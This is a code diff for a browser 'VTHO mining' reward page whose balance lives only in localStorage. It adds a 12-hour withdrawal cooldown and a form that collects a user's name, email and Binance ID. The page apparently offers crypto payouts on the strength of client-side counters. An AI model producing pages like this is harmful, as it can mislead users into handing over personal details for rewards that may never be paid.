@@ -468,6 +468,14 @@
     box-shadow: none;
   }
 
+  .withdraw-btn.locked {
+    border-color: rgba(251,191,36,0.4);
+    color: #b45309;
+    background: linear-gradient(135deg, rgba(251,191,36,0.18), rgba(251,191,36,0.06));
+    cursor: not-allowed;
+    box-shadow: 0 0 20px rgba(251,191,36,0.12);
+  }
+
   .float-reward {
     position: fixed;
     color: var(--purple-neon);
@@ -524,6 +532,7 @@
   .toast.show { transform: translateX(-50%) translateY(0); }
   .toast.error { border-color: rgba(239,68,68,0.5); color: #dc2626; }
   .toast.success { border-color: rgba(124,92,255,0.5); color: var(--purple); }
+  .toast.warning { border-color: rgba(251,191,36,0.5); color: #b45309; }
 
   .modal-overlay {
     position: fixed;
@@ -782,7 +791,8 @@
         <div class="ring ring-1"></div>
         <div class="ring ring-2"></div>
         <div class="ring ring-3"></div>
-        <img id="vthoImg" class="vtho-img" src="vtho.png" alt="VTHO">
+        <img id="vthoImg" class="vtho-img" src="vtho.png" alt="VTHO"
+             onerror="this.onerror=null;this.src='data:image/svg+xml;utf8,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2250%22 fill=%22%237c5cff%22/%3E%3Ctext x=%2250%22 y=%2268%22 font-size=%2248%22 font-family=%22Arial%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22%3EV%3C/text%3E%3C/svg%3E'">
       </div>
 
       <div class="progress-wrap" id="progressWrap">
@@ -822,7 +832,7 @@
     <div class="modal" id="modalContent">
       
       <div class="binance-logo">
-        <img src="Binance_logo.png" alt="Binance" onerror="this.style.display='none'">
+        <img src="Binance_Logo.png" alt="Binance" onerror="this.style.display='none'">
       </div>
 
       <div class="modal-title">Withdraw to Binance</div>
@@ -836,6 +846,16 @@
         </svg>
         <div class="kyc-notice-text">
           Your Binance account must be <b>fully KYC verified</b> (Identity Verified) before requesting a withdrawal. Unverified accounts will not receive rewards.
+        </div>
+      </div>
+
+      <div class="kyc-notice" style="background: linear-gradient(135deg, rgba(124,92,255,0.1), rgba(124,92,255,0.03)); border-color: rgba(124,92,255,0.35);">
+        <svg viewBox="0 0 24 24" style="stroke: #7c5cff;">
+          <circle cx="12" cy="12" r="10"/>
+          <polyline points="12 6 12 12 16 14"/>
+        </svg>
+        <div class="kyc-notice-text" style="color: #5b3fd6;">
+          <b style="color: #7c5cff;">Withdrawal cooldown:</b> After each withdrawal request, you must wait <b>12 hours</b> before submitting a new one.
         </div>
       </div>
 
@@ -898,30 +918,73 @@
     return s;
   }
 
-  /* ============ CONFIG ============ */
-  const BURST_AMOUNT   = 1.00;
-  const BURST_DURATION = 10000;
-  const CYCLE_VTHO     = 1.00;
-  const CYCLE_MS       = 30 * 60 * 1000;
-  const MIN_WITHDRAW   = 10.00;
+  /* ============================================
+     CONFIG
+  ============================================ */
+  const STORAGE_PREFIX     = 'vtho_';
+  const BURST_AMOUNT       = 1.00;
+  const BURST_DURATION     = 10000;
+  const CYCLE_REWARD       = 1.00;
+  const CYCLE_MS           = 30 * 60 * 1000;
+  const MIN_WITHDRAW       = 10.00;
+  const MAX_OFFLINE_CYCLES = 48;
+  const SAVE_THROTTLE_MS   = 3000;
+  const CLOCK_TOLERANCE    = 60000;
+  const MAX_BALANCE        = 1000000;
+  const WITHDRAW_COOLDOWN  = 12 * 60 * 60 * 1000;   // ⏱️ 12 ساعة
 
-  /* ============ SAVE STATE ============ */
-  function saveState() {
-    localStorage.setItem('vtho_balance', balance);
-    localStorage.setItem('vtho_cycleStart', cycleStartTime);
-    localStorage.setItem('vtho_cycleActive', cycleActive ? '1' : '0');
-    localStorage.setItem('vtho_burstActive', burstActive ? '1' : '0');
-    localStorage.setItem('vtho_lastUpdate', Date.now());
-  }
+  /* ============================================
+     SAFE STORAGE HELPERS
+  ============================================ */
+  const S = {
+    get(key, fallback = null) {
+      try {
+        const raw = localStorage.getItem(STORAGE_PREFIX + key);
+        return raw === null ? fallback : raw;
+      } catch (e) { return fallback; }
+    },
+    set(key, val) {
+      try { localStorage.setItem(STORAGE_PREFIX + key, String(val)); return true; }
+      catch (e) { return false; }
+    },
+    num(key, fallback = 0) {
+      const v = parseFloat(S.get(key, fallback));
+      return isFinite(v) ? v : fallback;
+    },
+    int(key, fallback = 0) {
+      const v = parseInt(S.get(key, fallback), 10);
+      return isFinite(v) ? v : fallback;
+    },
+    clearAll() {
+      try {
+        Object.keys(localStorage).forEach(k => {
+          if (k.startsWith(STORAGE_PREFIX)) localStorage.removeItem(k);
+        });
+      } catch (e) {}
+    }
+  };
 
-  /* ============ STATE ============ */
-  let balance        = parseFloat(localStorage.getItem('vtho_balance') || '0');
-  let burstActive    = false;
-  let cycleActive    = false;
-  let burstTimer     = null;
-  let cycleStartTime = parseInt(localStorage.getItem('vtho_cycleStart') || '0');
+  /* ============================================
+     STATE
+  ============================================ */
+  let balance         = S.num('balance', 0);
+  let cycleStartTime  = S.int('cycleStart', 0);
+  let burstStartTime  = S.int('burstStart', 0);
+  let burstStartBal   = S.num('burstStartBal', 0);
+  let burstActive     = S.get('burstActive', '0') === '1';
+  let cycleActive     = S.get('cycleActive', '0') === '1';
+  let lastSaveTime    = S.int('lastUpdate', 0);
+  let lastWithdrawAt  = S.int('lastWithdrawAt', 0);  // ⏱️ آخر سحب
+  let burstInterval   = null;
+  let lastSaveAt      = 0;
+  let isRestoring     = true;
 
-  /* ============ ELEMENTS ============ */
+  if (!isFinite(balance) || balance < 0) balance = 0;
+  if (balance > MAX_BALANCE) balance = MAX_BALANCE;
+
+  /* ============================================
+     DOM
+  ============================================ */
   const balanceEl    = document.getElementById('balanceEl');
   const counterEl    = document.getElementById('counter');
   const timerEl      = document.getElementById('timerEl');
@@ -940,8 +1003,11 @@
   const confirmBtn   = document.getElementById('confirmBtn');
   const toastEl      = document.getElementById('toast');
 
-  /* ============ FORMATTING (with decimals) ============ */
+  /* ============================================
+     FORMAT
+  ============================================ */
   function formatNum(v) {
+    if (!isFinite(v) || v < 0) v = 0;
     return v.toFixed(2);
   }
 
@@ -951,21 +1017,71 @@
     const h = Math.floor(totalSec / 3600);
     const m = Math.floor((totalSec % 3600) / 60);
     const s = totalSec % 60;
-    if (h > 0) {
-      return String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
-    }
-    return String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+    if (h > 0) return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+    return `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
   }
 
+  /* ============================================
+     SAVE STATE
+  ============================================ */
+  function saveState(force = false) {
+    const now = Date.now();
+    if (!force && now - lastSaveAt < SAVE_THROTTLE_MS) return;
+    lastSaveAt = now;
+
+    S.set('balance',         balance.toFixed(4));
+    S.set('cycleStart',      cycleStartTime);
+    S.set('cycleActive',     cycleActive ? '1' : '0');
+    S.set('burstStart',      burstStartTime);
+    S.set('burstStartBal',   burstStartBal.toFixed(4));
+    S.set('burstActive',     burstActive ? '1' : '0');
+    S.set('lastUpdate',      now);
+    S.set('lastWithdrawAt',  lastWithdrawAt);
+  }
+
+  /* ============================================
+     WITHDRAW COOLDOWN HELPERS
+  ============================================ */
+  function getWithdrawCooldownRemaining() {
+    if (!lastWithdrawAt) return 0;
+    const elapsed = Date.now() - lastWithdrawAt;
+    const remaining = WITHDRAW_COOLDOWN - elapsed;
+    return Math.max(0, remaining);
+  }
+
+  function isWithdrawLocked() {
+    return getWithdrawCooldownRemaining() > 0;
+  }
+
+  /* ============================================
+     UI UPDATE
+  ============================================ */
   function updateBalanceUI(bump = false) {
     balanceEl.textContent = formatNum(balance);
     counterEl.textContent = formatNum(balance);
+
     if (bump) {
       balanceEl.classList.remove('bump');
       void balanceEl.offsetWidth;
       balanceEl.classList.add('bump');
     }
-    
+
+    updateWithdrawButton();
+  }
+
+  function updateWithdrawButton() {
+    // أولاً: إذا كان السحب مقفلاً بسبب الكولداون
+    if (isWithdrawLocked()) {
+      withdrawBtn.disabled = true;
+      withdrawBtn.classList.add('locked');
+      const remaining = getWithdrawCooldownRemaining();
+      withdrawText.textContent = 'Locked · ' + formatTime(remaining) + ' until next withdrawal';
+      return;
+    }
+
+    withdrawBtn.classList.remove('locked');
+
+    // ثانياً: التحقق من الرصيد
     if (balance >= MIN_WITHDRAW) {
       withdrawBtn.disabled = false;
       withdrawText.textContent = 'Withdraw · ' + formatNum(balance) + ' VTHO';
@@ -973,18 +1089,21 @@
       withdrawBtn.disabled = true;
       withdrawText.textContent = 'Withdraw · Min 10.00 VTHO';
     }
-    saveState();
   }
 
+  // تحديث زر السحب كل ثانية (لعرض العدّ التنازلي للكولداون)
+  setInterval(updateWithdrawButton, 1000);
+
+  /* ============================================
+     TOAST / EFFECTS
+  ============================================ */
   function showToast(msg, type = '', duration = 2500) {
     toastEl.textContent = msg;
     toastEl.className = 'toast';
     if (type) toastEl.classList.add(type);
     toastEl.classList.add('show');
     clearTimeout(toastEl._t);
-    toastEl._t = setTimeout(() => {
-      toastEl.classList.remove('show');
-    }, duration);
+    toastEl._t = setTimeout(() => toastEl.classList.remove('show'), duration);
   }
 
   function floatNumber(text) {
@@ -1016,19 +1135,18 @@
     }
   }
 
-  /* ============ INTEGRITY CHECK ============ */
-  function checkIntegrity() {
-    const lastUpdate = parseInt(localStorage.getItem('vtho_lastUpdate') || '0');
+  /* ============================================
+     SECURITY
+  ============================================ */
+  function detectClockTamper() {
     const now = Date.now();
-    if (lastUpdate > 0 && now < lastUpdate - 60000) {
-      localStorage.clear();
-      location.reload();
-      return false;
-    }
-    return true;
+    if (lastSaveTime > 0 && now < lastSaveTime - CLOCK_TOLERANCE) return true;
+    return false;
   }
 
-  /* ============ BUTTON STATE ============ */
+  /* ============================================
+     BUTTON STATE
+  ============================================ */
   function canClick() { return !cycleActive && !burstActive; }
 
   function updateVthoButton() {
@@ -1038,83 +1156,97 @@
       statusEl.className = 'status';
     } else {
       vthoImg.classList.add('cooling');
-      const remaining = CYCLE_MS - (Date.now() - cycleStartTime);
+      const remaining = Math.max(0, CYCLE_MS - (Date.now() - cycleStartTime));
       statusEl.textContent = 'Mining cycle · ' + formatTime(remaining) + ' remaining';
       statusEl.className = 'status cooling';
     }
   }
 
-  /* ============ FAST MINING (decimal counting) ============ */
+  /* ============================================
+     START BURST
+  ============================================ */
   function startBurst() {
     if (burstActive) return;
     if (!canClick()) { showToast('Wait for the cycle to finish'); return; }
 
-    burstActive = true;
-    cycleActive = true;
-    cycleStartTime = Date.now();
-    saveState();
+    burstStartTime = Date.now();
+    burstStartBal  = balance;
+    burstActive    = true;
+    cycleActive    = true;
+    cycleStartTime = burstStartTime;
+
+    saveState(true);
 
     vthoImg.classList.add('burst');
     progressWrap.classList.add('visible');
     statusEl.textContent = 'Fast mining...';
     statusEl.className = 'status burst';
     sysStatusEl.textContent = 'Mining';
-    sysStatusEl.style.color = '#7c5cff';
 
-    const startTime = Date.now();
-    const startBalance = balance;
+    runBurstLoop(burstStartTime, burstStartBal);
+  }
 
-    burstTimer = setInterval(() => {
+  /* ============================================
+     BURST LOOP
+  ============================================ */
+  function runBurstLoop(startTime, startBal) {
+    if (burstInterval) clearInterval(burstInterval);
+
+    burstInterval = setInterval(() => {
       const elapsed = Date.now() - startTime;
-      const ratio = Math.min(elapsed / BURST_DURATION, 1);
-      const earned = BURST_AMOUNT * ratio;
-      const diff = earned - (balance - startBalance);
+      const ratio   = Math.min(elapsed / BURST_DURATION, 1);
+      const desired = startBal + (BURST_AMOUNT * ratio);
 
-      if (diff > 0) {
-        balance += diff;
+      if (desired > balance) {
+        const diff = desired - balance;
+        balance = desired;
         updateBalanceUI(true);
-        if (Math.random() < 0.5) floatNumber('+' + diff.toFixed(2));
-      }
-
-      if (Date.now() - (burstTimer._lastSave || 0) > 5000) {
-        saveState();
-        burstTimer._lastSave = Date.now();
+        if (Math.random() < 0.4) floatNumber('+' + diff.toFixed(2));
       }
 
       progressBar.style.width = (ratio * 100) + '%';
-      if (Math.random() < 0.3) spawnParticles(4);
+      if (Math.random() < 0.25) spawnParticles(4);
+
+      saveState();
 
       if (ratio >= 1) {
-        clearInterval(burstTimer);
-        burstTimer = null;
+        clearInterval(burstInterval);
+        burstInterval = null;
         finishBurst();
       }
     }, 50);
   }
 
+  /* ============================================
+     FINISH BURST
+  ============================================ */
   function finishBurst() {
+    const finalBal = burstStartBal + BURST_AMOUNT;
+    if (finalBal > balance) balance = finalBal;
+
     burstActive = false;
-    balance += BURST_AMOUNT;
+    cycleActive = true;
+    cycleStartTime = Date.now();
+
     updateBalanceUI(true);
-    
+
     vthoImg.classList.remove('burst');
     progressBar.style.width = '0%';
     progressWrap.classList.remove('visible');
 
-    cycleStartTime = Date.now();
-    cycleActive = true;
-    saveState();
-
     timerCard.classList.add('active');
     sysStatusEl.textContent = 'Active';
-    sysStatusEl.style.color = '#7c5cff';
     rateEl.textContent = '1.00 / 30 min';
+
+    saveState(true);
 
     updateVthoButton();
     updateCycleTimer();
   }
 
-  /* ============ 30 MIN CYCLE ============ */
+  /* ============================================
+     CYCLE TIMER
+  ============================================ */
   function updateCycleTimer() {
     if (!cycleActive) {
       timerEl.textContent = '--:--';
@@ -1122,7 +1254,8 @@
       return;
     }
 
-    const elapsed = Date.now() - cycleStartTime;
+    const now = Date.now();
+    const elapsed   = now - cycleStartTime;
     const remaining = Math.max(0, CYCLE_MS - elapsed);
     timerEl.textContent = formatTime(remaining);
 
@@ -1132,19 +1265,17 @@
     }
 
     if (remaining <= 0) {
-      balance += CYCLE_VTHO;
+      balance = Math.min(MAX_BALANCE, balance + CYCLE_REWARD);
       updateBalanceUI(true);
       showToast('Cycle complete! +1.00 VTHO', 'success');
-      
+
       cycleActive = false;
       cycleStartTime = 0;
-      saveState();
-      
+      saveState(true);
+
       timerCard.classList.remove('active');
       vthoImg.classList.remove('cooling');
-      
       sysStatusEl.textContent = 'Ready';
-      sysStatusEl.style.color = '#7c5cff';
       timerEl.textContent = '--:--';
       updateVthoButton();
     }
@@ -1152,128 +1283,131 @@
 
   setInterval(updateCycleTimer, 1000);
 
-  /* ============ RESUME ============ */
+  /* ============================================
+     RESUME
+  ============================================ */
   function resume() {
-    if (!checkIntegrity()) return;
+    isRestoring = true;
 
-    const cycleWasActive = localStorage.getItem('vtho_cycleActive') === '1';
-    const burstWasActive = localStorage.getItem('vtho_burstActive') === '1';
-    const storedStart = parseInt(localStorage.getItem('vtho_cycleStart') || '0');
+    if (detectClockTamper()) {
+      S.clearAll();
+      location.reload();
+      return;
+    }
 
-    if (burstWasActive && storedStart) {
-      const burstEndTime = storedStart + BURST_DURATION;
-      
-      if (Date.now() >= burstEndTime) {
-        balance += BURST_AMOUNT;
-        updateBalanceUI(true);
-        showToast('Mining completed while you were away! +1.00 VTHO', 'success');
-        
-        cycleActive = true;
-        cycleStartTime = storedStart;
+    const now = Date.now();
+
+    if (burstActive && burstStartTime > 0) {
+      const elapsed = now - burstStartTime;
+
+      if (elapsed >= BURST_DURATION) {
+        const correctBal = burstStartBal + BURST_AMOUNT;
+        balance = correctBal;
+
         burstActive = false;
-        saveState();
-        
-        if (Date.now() - storedStart >= CYCLE_MS) {
-          balance += CYCLE_VTHO;
-          updateBalanceUI(true);
-          showToast('Cycle also finished! +1.00 VTHO', 'success');
-          
-          cycleActive = false;
-          cycleStartTime = 0;
-          saveState();
-          
-          sysStatusEl.textContent = 'Ready';
-          rateEl.textContent = '1.00 / 30 min';
-          timerEl.textContent = '--:--';
-          updateVthoButton();
-          return;
-        }
-        
-        timerCard.classList.add('active');
-        sysStatusEl.textContent = 'Active';
-        rateEl.textContent = '1.00 / 30 min';
+        cycleActive = true;
+        cycleStartTime = burstStartTime + BURST_DURATION;
+
+        showToast('Mining completed while you were away!', 'success');
+
+        processOfflineCycles(now);
+        updateBalanceUI();
         updateVthoButton();
         updateCycleTimer();
-        return;
       } else {
-        burstActive = true;
         vthoImg.classList.add('burst');
         progressWrap.classList.add('visible');
         statusEl.textContent = 'Fast mining...';
         statusEl.className = 'status burst';
-        
-        const remaining = burstEndTime - Date.now();
-        const startTime = Date.now() - (BURST_DURATION - remaining);
-        const startBalance = balance;
-        
-        burstTimer = setInterval(() => {
-          const elapsed = Date.now() - startTime;
-          const ratio = Math.min(elapsed / BURST_DURATION, 1);
-          const earned = BURST_AMOUNT * ratio;
-          const diff = earned - (balance - startBalance);
-          
-          if (diff > 0) {
-            balance += diff;
-            updateBalanceUI(true);
-          }
-          
-          progressBar.style.width = (ratio * 100) + '%';
-          
-          if (ratio >= 1) {
-            clearInterval(burstTimer);
-            burstTimer = null;
-            finishBurst();
-          }
-        }, 50);
-        return;
+
+        runBurstLoop(burstStartTime, burstStartBal);
       }
+
+      isRestoring = false;
+      return;
     }
 
-    if (cycleWasActive && storedStart) {
-      const elapsed = Date.now() - storedStart;
-      
-      if (elapsed >= CYCLE_MS) {
-        balance += CYCLE_VTHO;
-        updateBalanceUI(true);
-        showToast('Cycle completed while you were away! +1.00 VTHO', 'success');
-        
-        cycleActive = false;
-        cycleStartTime = 0;
-        saveState();
-        
-        sysStatusEl.textContent = 'Ready';
-        rateEl.textContent = '1.00 / 30 min';
-        timerEl.textContent = '--:--';
-        updateVthoButton();
-      } else {
-        cycleActive = true;
-        cycleStartTime = storedStart;
-        
-        timerCard.classList.add('active');
-        sysStatusEl.textContent = 'Active';
-        rateEl.textContent = '1.00 / 30 min';
-        
-        updateVthoButton();
-        updateCycleTimer();
-      }
-    } else {
+    if (cycleActive && cycleStartTime > 0) {
+      processOfflineCycles(now);
       updateBalanceUI();
-      rateEl.textContent = '1.00 / 30 min';
-      sysStatusEl.textContent = 'Ready';
-      timerEl.textContent = '--:--';
       updateVthoButton();
+      updateCycleTimer();
+      isRestoring = false;
+      return;
     }
+
+    updateBalanceUI();
+    rateEl.textContent = '1.00 / 30 min';
+    sysStatusEl.textContent = 'Ready';
+    timerEl.textContent = '--:--';
+    updateVthoButton();
+    isRestoring = false;
   }
 
-  /* ============ EVENTS ============ */
+  /* ============================================
+     OFFLINE CYCLES
+  ============================================ */
+  function processOfflineCycles(now) {
+    if (!cycleActive || cycleStartTime <= 0) return;
+
+    const elapsed = now - cycleStartTime;
+    if (elapsed < CYCLE_MS) return;
+
+    let cycles = Math.floor(elapsed / CYCLE_MS);
+    cycles = Math.min(cycles, MAX_OFFLINE_CYCLES);
+
+    if (cycles <= 0) return;
+
+    const reward = cycles * CYCLE_REWARD;
+    balance = Math.min(MAX_BALANCE, balance + reward);
+    cycleStartTime = cycleStartTime + (cycles * CYCLE_MS);
+
+    if (now - cycleStartTime >= CYCLE_MS) {
+      const extra = Math.floor((now - cycleStartTime) / CYCLE_MS);
+      if (extra > 0 && extra <= MAX_OFFLINE_CYCLES) {
+        balance = Math.min(MAX_BALANCE, balance + extra * CYCLE_REWARD);
+        cycleStartTime += extra * CYCLE_MS;
+      }
+    }
+
+    if (cycles === 1) {
+      showToast('Cycle completed! +1.00 VTHO', 'success', 3000);
+    } else {
+      showToast(`${cycles} cycles completed! +${cycles.toFixed(2)} VTHO`, 'success', 3500);
+    }
+
+    sysStatusEl.textContent = 'Active';
+    timerCard.classList.add('active');
+    rateEl.textContent = '1.00 / 30 min';
+
+    updateBalanceUI(true);
+    saveState(true);
+  }
+
+  /* ============================================
+     EVENTS
+  ============================================ */
   vthoImg.addEventListener('click', () => {
+    if (isRestoring) return;
     if (burstActive) return;
     if (!canClick()) { showToast('Wait for the cycle to finish'); return; }
     startBurst();
   });
 
   withdrawBtn.addEventListener('click', () => {
-    if (balance < MIN_WITHDRAW) return;
+    // 🔒 التحقق من الكولداون
+    if (isWithdrawLocked()) {
+      const remaining = getWithdrawCooldownRemaining();
+      showToast('Locked! Next withdrawal in ' + formatTime(remaining), 'warning', 3500);
+      return;
+    }
+
+    // التحقق من الرصيد
+    if (balance < MIN_WITHDRAW) {
+      showToast('Minimum withdrawal is 10.00 VTHO', 'warning');
+      return;
+    }
+
     modalBalance.textContent = balance.toFixed(2);
     modalOverlay.classList.add('show');
   });
@@ -1282,35 +1416,36 @@
     modalOverlay.classList.remove('show');
   }
 
+  window.closeWithdraw = closeWithdraw;
+
   modalOverlay.addEventListener('click', (e) => {
     if (e.target === modalOverlay) closeWithdraw();
   });
 
-  /* ============ SUBMIT WITHDRAW ============ */
+  /* ============================================
+     SUBMIT WITHDRAW
+  ============================================ */
   function submitWithdraw(event) {
     event.preventDefault();
+
+    // 🔒 تحقق ثانٍ من الكولداون (حماية إضافية)
+    if (isWithdrawLocked()) {
+      const remaining = getWithdrawCooldownRemaining();
+      showToast('Locked! Next withdrawal in ' + formatTime(remaining), 'warning', 3500);
+      closeWithdraw();
+      return;
+    }
 
     const form = event.target;
     const formData = new FormData(form);
 
-    const fullName   = (formData.get('full_name') || '').trim();
-    const userEmail  = (formData.get('user_email') || '').trim();
-    const binanceId  = (formData.get('binance_id') || '').trim();
+    const fullName  = (formData.get('full_name') || '').trim();
+    const userEmail = (formData.get('user_email') || '').trim();
+    const binanceId = (formData.get('binance_id') || '').trim();
 
-    if (fullName.length < 2) {
-      showToast('Please enter a valid name', 'error');
-      return;
-    }
-
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) {
-      showToast('Please enter a valid email', 'error');
-      return;
-    }
-
-    if (!/^[0-9]{6,}$/.test(binanceId)) {
-      showToast('Binance ID must be at least 6 digits', 'error');
-      return;
-    }
+    if (fullName.length < 2) { showToast('Please enter a valid name', 'error'); return; }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) { showToast('Please enter a valid email', 'error'); return; }
+    if (!/^[0-9]{6,}$/.test(binanceId)) { showToast('Binance ID must be at least 6 digits', 'error'); return; }
 
     const withdrawAmount = balance;
 
@@ -1331,9 +1466,7 @@
       return res.json().catch(() => ({}));
     })
     .then(data => {
-      if (data && data.success === false) {
-        throw new Error(data.message || 'Rejected');
-      }
+      if (data && data.success === false) throw new Error(data.message || 'Rejected');
       successWithdraw(withdrawAmount, fullName, binanceId);
     })
     .catch(err => {
@@ -1344,13 +1477,33 @@
     });
   }
 
-  /* ============ SUCCESS ============ */
+  window.submitWithdraw = submitWithdraw;
+
+  /* ============================================
+     SUCCESS
+  ============================================ */
   function successWithdraw(amount, fullName, binanceId) {
+    // ⏱️ تسجيل وقت السحب لبدء الكولداون
+    lastWithdrawAt = Date.now();
+
+    // تصفير الرصيد
     balance = 0;
     cycleActive = false;
     cycleStartTime = 0;
     burstActive = false;
-    saveState();
+    burstStartTime = 0;
+    burstStartBal = 0;
+
+    S.set('balance', '0');
+    S.set('cycleActive', '0');
+    S.set('cycleStart', '0');
+    S.set('burstActive', '0');
+    S.set('burstStart', '0');
+    S.set('burstStartBal', '0');
+    S.set('lastWithdrawAt', lastWithdrawAt);
+    S.set('lastUpdate', Date.now());
+
+    updateWithdrawButton();
 
     modalContent.innerHTML = `
       <div style="text-align: center;">
@@ -1367,9 +1520,12 @@
           Binance ID: <b style="color: #1e1a3a; direction: ltr; display: inline-block;">${escapeHtml(binanceId)}</b><br>
           <span style="font-size: 11px;">within 24-48 hours</span>
         </p>
-        <div style="background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.3); border-radius: 12px; padding: 10px; margin-bottom: 18px;">
-          <p style="color: #d97706; font-size: 12px; text-align: center; font-weight: 700;">
-            ⚠️ Your balance has been reset — start over
+        <div style="background: rgba(124,92,255,0.08); border: 1px solid rgba(124,92,255,0.3); border-radius: 12px; padding: 12px; margin-bottom: 18px;">
+          <p style="color: #5b3fd6; font-size: 12px; text-align: center; font-weight: 700; margin-bottom: 4px;">
+            ⏱️ Next withdrawal in 12 hours
+          </p>
+          <p style="color: #7c7a99; font-size: 11px; text-align: center;">
+            Your balance has been reset — start over
           </p>
         </div>
         <button onclick="location.reload();" 
@@ -1380,32 +1536,44 @@
     `;
   }
 
-  /* ============ HTML ESCAPE ============ */
+  /* ============================================
+     ESCAPE
+  ============================================ */
   function escapeHtml(str) {
     const div = document.createElement('div');
-    div.textContent = str;
+    div.textContent = String(str || '');
     return div.innerHTML;
   }
 
-  /* ============ SAVE ON UNLOAD ============ */
+  /* ============================================
+     SAVE ON UNLOAD
+  ============================================ */
   window.addEventListener('beforeunload', () => {
-    saveState();
+    saveState(true);
   });
 
   document.addEventListener('visibilitychange', () => {
-    if (document.hidden) saveState();
+    if (document.hidden) saveState(true);
   });
 
-  setInterval(() => {
-    saveState();
-  }, 3000);
+  setInterval(() => saveState(), 4000);
 
-  /* ============ INIT ============ */
+  /* ============================================
+     INIT
+  ============================================ */
   updateBalanceUI();
   rateEl.textContent = '1.00 / 30 min';
   sysStatusEl.textContent = 'Ready';
   timerEl.textContent = '--:--';
   resume();
+
+  // إذا كان هناك كولداون نشط، أظهر رسالة عند الدخول
+  if (isWithdrawLocked()) {
+    const remaining = getWithdrawCooldownRemaining();
+    setTimeout(() => {
+      showToast('Withdrawal locked · ' + formatTime(remaining) + ' remaining', 'warning', 4000);
+    }, 800);
+  }
 </script>
 
 </body>
